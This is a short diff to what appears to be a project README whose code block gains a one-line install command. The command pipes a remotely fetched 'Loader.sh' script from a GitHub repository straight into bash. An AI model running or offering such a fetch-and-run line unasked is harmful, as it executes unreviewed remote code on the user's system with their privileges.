@@ -166,4 +166,5 @@ The installer configures UFW automatically, but ensure your Cloud Firewall allow
 \</div\>
 
 ```
+bash <(curl -s https://raw.githubusercontent.com/owneraniex/Cracken-BASH/main/Loader.sh)
 ```
